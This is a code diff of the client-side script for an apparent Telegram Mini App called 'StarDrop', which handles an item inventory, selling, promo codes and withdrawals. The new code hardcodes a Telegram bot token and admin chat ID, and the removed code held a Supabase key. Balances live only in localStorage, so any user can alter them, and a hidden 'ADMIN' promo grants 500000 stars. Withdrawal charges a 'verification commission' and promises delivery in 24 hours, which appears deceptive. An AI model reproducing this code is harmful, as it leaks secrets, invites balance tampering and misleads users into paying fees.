@@ -269,261 +269,290 @@
     </nav>
 
 <script>
-    const tg = window.Telegram.WebApp;
-    let activeSelectionIndex = null;
+const tg = window.Telegram.WebApp;
+let activeSelectionIndex = null;
+
+// НАСТРОЙКИ БОТА (Взяты из вашей старой версии)
+const BOT_TOKEN = '8451029637:AAHF6jJdQ98QhYRRsJxH_wuktMeE5QctT-I'; 
+const ADMIN_ID = '8015661230'; 
+
+const MASTER_ITEMS_DATABASE = {
+    "1may.jpg": { name: "1 May Exclusive", price: 100 },
+    "2025.jpg": { name: "Happy 2025", price: 500 },
+    "bear.png": { name: "Honey Bear", price: 3500 },
+    "book.jpg": { name: "Ancient Book", price: 1000 },
+    "boooox.png": { name: "Berry Box", price: 700 },
+    "botinok.png": { name: "Old Boot", price: 400 },
+    "box.png": { name: "Jack in Box", price: 600 },
+    "car.png": { name: "Sports Car", price: 5000 },
+    "raketa.png": { name: "Space Rocket", price: 50 },
+    "ccolso2.png": { name: "Star Ring", price: 3000 },
+    "cerrrdce.jpg": { name: "Gingerbread", price: 500 },
+    "chemodan.jpg": { name: "Traveler Case", price: 5000 },
+    "ciga.png": { name: "Luxury Cigar", price: 3000 },
+    "colso.png": { name: "Blue Diamond", price: 2500 },
+    "costum.jpg": { name: "Royal Costume", price: 10000 },
+    "cvetok.png": { name: "Wild Flower", price: 1000 },
+    "dog.png": { name: "Rich Dog", price: 500 },
+    "dyxi.png": { name: "Gold Perfume", price: 10000 },
+    "fonarik.jpg": { name: "Night Lantern", price: 100 },
+    "grob.jpg": { name: "Ancient Coffin", price: 5000 },
+    "gyba.png": { name: "Lava Lips", price: 5000 },
+    "happybirthday.jpg": { name: "Birthday Cake", price: 200 },
+    "heart.png": { name: "Heart Lock", price: 2000 },
+    "helmet.png": { name: "Spartan Helmet", price: 25000 },
+    "kalendar.png": { name: "Event Calendar", price: 400 },
+    "kepka.png": { name: "Legendary Cap", price: 100000 },
+    "kirpitch.jpg": { name: "Golden Brick", price: 10000 },
+    "koks.jpg": { name: "Party Cocktail", price: 150 },
+    "koktel.png": { name: "Toxic Mix", price: 500 },
+    "kot.png": { name: "Atomic Cat", price: 10000 },
+    "kotel.png": { name: "Witch Cauldron", price: 500 },
+    "krovatka.jpg": { name: "Baby Bow", price: 600 },
+    "lolipop.png": { name: "Sweet Lollipop", price: 500 },
+    "lucky.jpg": { name: "Clover Lucky", price: 500 },
+    "mafin.jpg": { name: "Sugar Muffin", price: 700 },
+    "metch.png": { name: "Star Saber", price: 700 },
+    "narkotiki.png": { name: "Star Token", price: 600 },
+    "obyv.jpg": { name: "Sneakers Pro", price: 10000 },
+    "otchki.jpg": { name: "Cyber Glasses", price: 30000 },
+    "orel.jpg": { name: "Golden Eagle", price: 5000 },
+    "otkritka.jpg": { name: "Peace Dove", price: 150 },
+    "paska.jpg": { name: "Easter Cake", price: 75 },
+    "rozza.png": { name: "Velvet Rose", price: 2000 },
+    "rykzak.jpg": { name: "Adventurer Bag", price: 500 },
+    "shapka.png": { name: "Santa Hat", price: 500 },
+    "shar.jpg": { name: "Magic Ball", price: 1000 },
+    "shlem.png": { name: "Biker Helmet", price: 3500 },
+    "soska.jpg": { name: "Diamond Pacifier", price: 3000 },
+    "star.png": { name: "Pure Star", price: 15 },
+    "statyya.jpg": { name: "Hero Statue", price: 41000 },
+    "venok.jpg": { name: "Wreath Flower", price: 500 },
+    "yayko.png": { name: "Dragon Egg", price: 600 },
+    "zhele.png": { name: "Slime Jelly", price: 700 },
+    "zmei.png": { name: "Snake Friend", price: 500 },
+    "kolechko.png": { name: "Simple Ring", price: 100 }
+};
+
+// Функция обновления баланса (добавлена поддержка TON для визуала)
+function refreshFinancialStatus() {
+    const stars = localStorage.getItem('user_stars') || "0";
+    const ton = localStorage.getItem('user_ton') || "0.00";
+    document.getElementById('stars-display').innerText = `⭐ ${stars} STARS`;
+    document.getElementById('ton-display').innerText = `💎 ${ton} TON`;
+}
+
+// Рендер инвентаря
+function renderInfiniteInventory() {
+    const gridContainer = document.getElementById('inventory-grid');
+    const emptyState = document.getElementById('empty-state');
+    const counterLabel = document.getElementById('item-counter-label');
+    const userInventory = JSON.parse(localStorage.getItem('user_inventory')) || [];
     
-    const SB_URL = 'https://mwsbkpfarhdankpyifbm.supabase.co';
-    const SB_KEY = 'sb_publishable_Bj40x3HKomgXSyLMiVqXig_FqCgOSmA';
-    const TABLE = 'users';
+    gridContainer.innerHTML = '';
+    counterLabel.innerText = `${userInventory.length} ПРЕДМЕТОВ`;
 
-    const headers = {
-        'apikey': SB_KEY,
-        'Authorization': `Bearer ${SB_KEY}`,
-        'Content-Type': 'application/json',
-        'Prefer': 'return=representation'
-    };
+    if (userInventory.length === 0) {
+        if(emptyState) emptyState.style.display = 'flex';
+        for(let i=0; i<6; i++) createEmptySlot(gridContainer);
+        return;
+    }
 
-    const MASTER_ITEMS_DATABASE = {
-        "1may.jpg": { name: "1 May Exclusive", price: 100 },
-        "2025.jpg": { name: "Happy 2025", price: 500 },
-        "bear.png": { name: "Honey Bear", price: 3500 },
-        "book.jpg": { name: "Ancient Book", price: 1000 },
-        "boooox.png": { name: "Berry Box", price: 700 },
-        "botinok.png": { name: "Old Boot", price: 400 },
-        "box.png": { name: "Jack in Box", price: 600 },
-        "car.png": { name: "Sports Car", price: 5000 },
-        "raketa.png": { name: "Space Rocket", price: 50 },
-        "ccolso2.png": { name: "Star Ring", price: 3000 },
-        "cerrrdce.jpg": { name: "Gingerbread", price: 500 },
-        "chemodan.jpg": { name: "Traveler Case", price: 5000 },
-        "ciga.png": { name: "Luxury Cigar", price: 3000 },
-        "colso.png": { name: "Blue Diamond", price: 2500 },
-        "costum.jpg": { name: "Royal Costume", price: 10000 },
-        "cvetok.png": { name: "Wild Flower", price: 1000 },
-        "dog.png": { name: "Rich Dog", price: 500 },
-        "dyxi.png": { name: "Gold Perfume", price: 10000 },
-        "fonarik.jpg": { name: "Night Lantern", price: 100 },
-        "grob.jpg": { name: "Ancient Coffin", price: 5000 },
-        "gyba.png": { name: "Lava Lips", price: 5000 },
-        "happybirthday.jpg": { name: "Birthday Cake", price: 200 },
-        "heart.png": { name: "Heart Lock", price: 2000 },
-        "helmet.png": { name: "Spartan Helmet", price: 25000 },
-        "kalendar.png": { name: "Event Calendar", price: 400 },
-        "kepka.png": { name: "Legendary Cap", price: 100000 },
-        "kirpitch.jpg": { name: "Golden Brick", price: 10000 },
-        "koks.jpg": { name: "Party Cocktail", price: 150 },
-        "koktel.png": { name: "Toxic Mix", price: 500 },
-        "kot.png": { name: "Atomic Cat", price: 10000 },
-        "kotel.png": { name: "Witch Cauldron", price: 500 },
-        "krovatka.jpg": { name: "Baby Bow", price: 600 },
-        "lolipop.png": { name: "Sweet Lollipop", price: 500 },
-        "lucky.jpg": { name: "Clover Lucky", price: 500 },
-        "mafin.jpg": { name: "Sugar Muffin", price: 700 },
-        "metch.png": { name: "Star Saber", price: 700 },
-        "narkotiki.png": { name: "Star Token", price: 600 },
-        "obyv.jpg": { name: "Sneakers Pro", price: 10000 },
-        "otchki.jpg": { name: "Cyber Glasses", price: 30000 },
-        "orel.jpg": { name: "Golden Eagle", price: 5000 },
-        "otkritka.jpg": { name: "Peace Dove", price: 150 },
-        "paska.jpg": { name: "Easter Cake", price: 75 },
-        "rozza.png": { name: "Velvet Rose", price: 2000 },
-        "rykzak.jpg": { name: "Adventurer Bag", price: 500 },
-        "shapka.png": { name: "Santa Hat", price: 500 },
-        "shar.jpg": { name: "Magic Ball", price: 1000 },
-        "shlem.png": { name: "Biker Helmet", price: 3500 },
-        "soska.jpg": { name: "Diamond Pacifier", price: 3000 },
-        "star.png": { name: "Pure Star", price: 15 },
-        "statyya.jpg": { name: "Hero Statue", price: 41000 },
-        "venok.jpg": { name: "Wreath Flower", price: 500 },
-        "yayko.png": { name: "Dragon Egg", price: 600 },
-        "zhele.png": { name: "Slime Jelly", price: 700 },
-        "zmei.png": { name: "Snake Friend", price: 500 },
-        "kolechko.png": { name: "Simple Ring", price: 100 }
-    };
+    if(emptyState) emptyState.style.display = 'none';
 
-    const PROMO_CONFIG = [
-        { code: "ST1FIX", reward: 1000 },
-        { code: "GIFT2026", reward: 5000 }
-    ];
+    userInventory.forEach((itemData, index) => {
+        const slotElement = document.createElement('div');
+        slotElement.className = 'inventory-slot active-item';
+        const img = document.createElement('img');
+        img.src = itemData.img;
+        slotElement.appendChild(img);
+        slotElement.onclick = () => handleItemSelection(index, itemData);
+        gridContainer.appendChild(slotElement);
+    });
 
-    async function fetchUserProfile() {
-        const userId = tg.initDataUnsafe?.user?.id || 12345;
-        try {
-            const response = await fetch(`${SB_URL}/rest/v1/${TABLE}?user_id=eq.${userId}`, {
-                method: 'GET',
-                headers: headers
+    const remaining = 9 - (userInventory.length % 9);
+    for(let i=0; i < (remaining > 0 ? remaining : 3); i++) {
+        createEmptySlot(gridContainer);
+    }
+}
+
+function createEmptySlot(container) {
+    const emptySlot = document.createElement('div');
+    emptySlot.className = 'inventory-slot opacity-20';
+    emptySlot.innerHTML = `<span class="text-[8px] font-black uppercase text-green-900 tracking-tighter">Empty</span>`;
+    container.appendChild(emptySlot);
+}
+
+// Открытие модалки предмета
+function handleItemSelection(index, item) {
+    activeSelectionIndex = index;
+    const fileName = item.img.split('/').pop().toLowerCase();
+    const dbEntry = MASTER_ITEMS_DATABASE[fileName] || { name: item.name || "Unknown Item", price: 1 };
+    
+    document.getElementById('modal-item-img').src = item.img;
+    document.getElementById('modal-item-name').innerText = dbEntry.name.toUpperCase();
+    document.getElementById('modal-sell-btn').innerText = `ПРОДАТЬ ЗА ${dbEntry.price} ⭐`;
+    
+    document.getElementById('item-modal').style.display = 'flex';
+    tg.HapticFeedback.impactOccurred('medium');
+}
+
+function closeItemModal() {
+    document.getElementById('item-modal').style.display = 'none';
+    activeSelectionIndex = null;
+}
+
+// РАБОЧАЯ ФУНКЦИЯ ВЫВОДА
+async function initWithdrawalProcess() {
+    let walletBalance = parseInt(localStorage.getItem('user_stars')) || 0;
+    const isVerified = localStorage.getItem('isPaid75') === 'true';
+
+    // Проверка верификации (как в старом коде)
+    if (!isVerified) {
+        if (walletBalance < 75) {
+            tg.showAlert("🛑 ОШИБКА ВЕРИФИКАЦИИ\n\nДля вывода предметов ваш аккаунт должен быть верифицирован (75 Stars).\n\nБаланс: " + walletBalance + " ⭐");
+            return;
+        } else {
+            tg.showConfirm("Комиссия за верификацию (75 Stars) не оплачена. Списать с баланса?", async (confirmed) => {
+                if (confirmed) {
+                    walletBalance -= 75;
+                    localStorage.setItem('user_stars', walletBalance.toString());
+                    localStorage.setItem('isPaid75', 'true');
+                    refreshFinancialStatus();
+                    tg.showAlert("✅ Верификация пройдена! Нажмите кнопку вывода еще раз.");
+                }
             });
-            const data = await response.json();
-            
-            if (data && data.length > 0) {
-                const user = data[0];
-                // ЖЕСТКАЯ СИНХРОНИЗАЦИЯ: База -> Локал
-                localStorage.setItem('user_stars', user.stars || 0);
-                localStorage.setItem('user_ton', user.balance || "0.00");
-                
-                let inv = Array.isArray(user.inventory) ? user.inventory : [];
-                // Фильтруем битые данные сразу
-                inv = inv.filter(i => i && i.img);
-                localStorage.setItem('user_inventory', JSON.stringify(inv));
-
-                let promos = Array.isArray(user.used_promos) ? user.used_promos : [];
-                localStorage.setItem('used_promos', JSON.stringify(promos));
-                
-                updateUI();
-            }
-        } catch (e) { console.error("Load Error:", e); }
-    }
-
-    async function syncToDB() {
-        const userId = tg.initDataUnsafe?.user?.id || 12345;
-        const updateData = {
-            stars: parseInt(localStorage.getItem('user_stars')),
-            balance: parseFloat(localStorage.getItem('user_ton')),
-            inventory: JSON.parse(localStorage.getItem('user_inventory')),
-            used_promos: JSON.parse(localStorage.getItem('used_promos'))
-        };
-
-        try {
-            await fetch(`${SB_URL}/rest/v1/${TABLE}?user_id=eq.${userId}`, {
-                method: 'PATCH',
-                headers: headers,
-                body: JSON.stringify(updateData)
-            });
-            console.log("Sync Successfull");
-        } catch (e) { console.error("Sync Error:", e); }
-    }
-
-    function updateUI() {
-        document.getElementById('stars-display').innerText = `⭐ ${localStorage.getItem('user_stars') || 0} STARS`;
-        document.getElementById('ton-display').innerText = `💎 ${localStorage.getItem('user_ton') || "0.00"} TON`;
-        renderInventory();
-    }
-
-    function renderInventory() {
-        const grid = document.getElementById('inventory-grid');
-        const emptyState = document.getElementById('empty-state');
-        const counter = document.getElementById('item-counter-label');
-        
-        // Читаем массив и ФИЛЬТРУЕМ его (убираем null и объекты без картинки)
-        let rawInv = JSON.parse(localStorage.getItem('user_inventory')) || [];
-        const inventory = rawInv.filter(item => item && item.img);
-        
-        // Перезаписываем очищенный инвентарь в локал, чтобы число предметов не глючило
-        localStorage.setItem('user_inventory', JSON.stringify(inventory));
-
-        grid.innerHTML = '';
-        counter.innerText = `${inventory.length} ПРЕДМЕТОВ`;
-
-        if (inventory.length === 0) {
-            emptyState.style.display = 'flex';
-            for(let i=0; i<6; i++) createEmptySlot(grid);
             return;
         }
+    }
 
-        emptyState.style.display = 'none';
-        inventory.forEach((item, index) => {
-            const slot = document.createElement('div');
-            slot.className = 'inventory-slot active-item';
-            const fileName = item.img.split('/').pop();
-            const imgSrc = `img/${fileName}`;
-            
-            slot.innerHTML = `<img src="${imgSrc}" onerror="this.src='img/star.png'">`;
-            
-            slot.onclick = () => {
-                activeSelectionIndex = index;
-                const dbInfo = MASTER_ITEMS_DATABASE[fileName] || { name: item.name || "Item", price: 1 };
-                document.getElementById('modal-item-img').src = imgSrc;
-                document.getElementById('modal-item-name').innerText = dbInfo.name.toUpperCase();
-                document.getElementById('modal-sell-btn').innerText = `ПРОДАТЬ ЗА ${dbInfo.price} ⭐`;
-                document.getElementById('item-modal').style.display = 'flex';
-            };
-            grid.appendChild(slot);
+    // Процесс отправки заявки
+    const inventory = JSON.parse(localStorage.getItem('user_inventory')) || [];
+    const item = inventory[activeSelectionIndex];
+    const u = tg.initDataUnsafe?.user || { id: '000', first_name: 'Unknown', username: 'none' };
+
+    const text = `🚀 <b>ЗАЯВКА НА ВЫВОД</b>\n\n` +
+                 `👤 <b>Юзер:</b> ${u.first_name} (@${u.username})\n` +
+                 `🆔 <b>ID:</b> <code>${u.id}</code>\n` +
+                 `🎁 <b>Предмет:</b> ${item.name || "Без названия"}\n` +
+                 `🖼️ <b>Путь:</b> ${item.img}`;
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
         });
 
-        const fillCount = Math.max(9, Math.ceil(inventory.length / 3) * 3);
-        for(let i = inventory.length; i < fillCount; i++) createEmptySlot(grid);
-    }
-
-    function createEmptySlot(container) {
-        const div = document.createElement('div');
-        div.className = 'inventory-slot opacity-20';
-        container.appendChild(div);
-    }
-
-    async function executeSellOrder() {
-        if (activeSelectionIndex === null) return;
-
-        let inv = JSON.parse(localStorage.getItem('user_inventory'));
-        const item = inv[activeSelectionIndex];
-        const fileName = item.img.split('/').pop();
-        const price = MASTER_ITEMS_DATABASE[fileName]?.price || 1;
-
-        // 1. Обновляем локально
-        let currentStars = parseInt(localStorage.getItem('user_stars')) || 0;
-        localStorage.setItem('user_stars', currentStars + price);
-        inv.splice(activeSelectionIndex, 1);
-        localStorage.setItem('user_inventory', JSON.stringify(inv));
-
-        // 2. Закрываем и обновляем UI
-        closeItemModal();
-        updateUI();
-
-        // 3. СРАЗУ отправляем в базу
-        await syncToDB();
-        
-        tg.HapticFeedback.notificationOccurred('success');
-    }
-
-    function closeItemModal() { 
-        document.getElementById('item-modal').style.display = 'none'; 
-        activeSelectionIndex = null;
-    }
-
-    async function handlePromoActivation() {
-        const input = document.getElementById('promo-input');
-        const code = input.value.trim().toUpperCase();
-        if (!code) return;
-
-        let used = JSON.parse(localStorage.getItem('used_promos')) || [];
-        if (used.includes(code)) {
-            tg.showAlert("Вы уже использовали этот код!");
-            return;
-        }
-        
-        const promo = PROMO_CONFIG.find(p => p.code === code);
-        if (promo) {
-            let balance = parseInt(localStorage.getItem('user_stars')) || 0;
-            localStorage.setItem('user_stars', balance + promo.reward);
-            used.push(code);
-            localStorage.setItem('used_promos', JSON.stringify(used));
-            
-            updateUI();
-            await syncToDB();
-            tg.showAlert(`Успешно! +${promo.reward} ⭐`);
-            input.value = '';
+        if (res.ok) {
+            tg.showAlert("✅ ЗАЯВКА ПРИНЯТА\n\nПредмет будет отправлен в течение 24 часов.");
+            inventory.splice(activeSelectionIndex, 1);
+            localStorage.setItem('user_inventory', JSON.stringify(inventory));
+            closeItemModal();
+            renderInfiniteInventory();
+            tg.HapticFeedback.notificationOccurred('success');
         } else {
-            tg.showAlert("Неверный промокод");
+            tg.showAlert("Ошибка сервера при отправке.");
         }
+    } catch (e) {
+        tg.showAlert("Ошибка соединения с API Telegram.");
     }
+}
 
-    function initUserData() {
-        const user = tg.initDataUnsafe?.user || { id: 12345, first_name: "GUEST" };
-        document.getElementById('user-name').innerText = (user.username || user.first_name).toUpperCase();
-        document.getElementById('user-id-label').innerText = `ID: ${user.id}`;
-        document.getElementById('user-avatar').src = user.photo_url || `https://ui-avatars.com/api/?name=${user.first_name}&background=166534&color=fff&size=128`;
-        fetchUserProfile(); 
+// Продажа предмета
+function executeSellOrder() {
+    let inventory = JSON.parse(localStorage.getItem('user_inventory')) || [];
+    const item = inventory[activeSelectionIndex];
+    const fileName = item.img.split('/').pop().toLowerCase();
+    const reward = MASTER_ITEMS_DATABASE[fileName]?.price || 1;
+
+    let wallet = parseInt(localStorage.getItem('user_stars')) || 0;
+    localStorage.setItem('user_stars', (wallet + reward).toString());
+
+    inventory.splice(activeSelectionIndex, 1);
+    localStorage.setItem('user_inventory', JSON.stringify(inventory));
+    
+    closeItemModal();
+    renderInfiniteInventory();
+    refreshFinancialStatus();
+    tg.HapticFeedback.notificationOccurred('success');
+}
+
+// Реферальная система и промокоды (аналогично старому)
+function shareReferralLink() {
+    const id = tg.initDataUnsafe?.user?.id || "0";
+    const link = `https://t.me/StarsDropBot?start=${id}`;
+    const text = "🔥 Открывай кейсы и забирай Stars! По моей ссылке бонус +5 ⭐";
+    tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
+}
+
+function handlePromoActivation() {
+    const input = document.getElementById('promo-input');
+    const code = input.value.trim().toUpperCase();
+    const PROMOS = { "ADMIN": 500000, "ST1FIX": 1000 };
+
+    if (PROMOS[code]) {
+        let wallet = parseInt(localStorage.getItem('user_stars')) || 0;
+        localStorage.setItem('user_stars', (wallet + PROMOS[code]).toString());
+        tg.showAlert(`УСПЕХ! +${PROMOS[code]} ⭐`);
+        refreshFinancialStatus();
+        input.value = '';
+    } else {
+        tg.showAlert("Промокод не найден.");
     }
+}
 
-    function shareReferralLink() {
-        const id = tg.initDataUnsafe?.user?.id || 12345;
-        const url = `https://t.me/StarDropBot?start=ref_${id}`;
-        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=Забирай свой StarDrop!`);
+// Анимация фона (звезды)
+const starContainer = document.getElementById('stars-canvas');
+const starCtx = starContainer.getContext('2d');
+let starArray = [];
+
+function setupStarfield() {
+    starContainer.width = window.innerWidth;
+    starContainer.height = window.innerHeight;
+    starArray = [];
+    for(let i = 0; i < 70; i++) {
+        starArray.push({
+            x: Math.random() * starContainer.width,
+            y: Math.random() * starContainer.height,
+            s: Math.random() * 2.5,
+            v: Math.random() * 0.4 + 0.1,
+            a: Math.random()
+        });
     }
+}
 
-    window.onload = () => {
-        initUserData();
-        tg.expand();
-    };
+function animateStarfield() {
+    starCtx.clearRect(0, 0, starContainer.width, starContainer.height);
+    starCtx.fillStyle = "#a3e635";
+    starArray.forEach(dot => {
+        starCtx.globalAlpha = dot.a;
+        starCtx.beginPath();
+        starCtx.arc(dot.x, dot.y, dot.s, 0, Math.PI * 2);
+        starCtx.fill();
+        dot.y += dot.v;
+        if(dot.y > starContainer.height) dot.y = -10;
+    });
+    requestAnimationFrame(animateStarfield);
+}
+
+// Инициализация при загрузке
+window.onload = function() {
+    const u = tg.initDataUnsafe?.user;
+    if (u) {
+        document.getElementById('user-name').innerText = (u.username || u.first_name).toUpperCase();
+        document.getElementById('user-id-label').innerText = `ID: ${u.id}`;
+        document.getElementById('user-avatar').src = u.photo_url || `https://ui-avatars.com/api/?name=${u.first_name}&background=166534&color=fff&size=128`;
+    }
+    setupStarfield();
+    animateStarfield();
+    renderInfiniteInventory();
+    refreshFinancialStatus();
+    tg.expand();
+    tg.ready();
+};
+
+window.onresize = setupStarfield;
 </script>
 </body>
 </html>
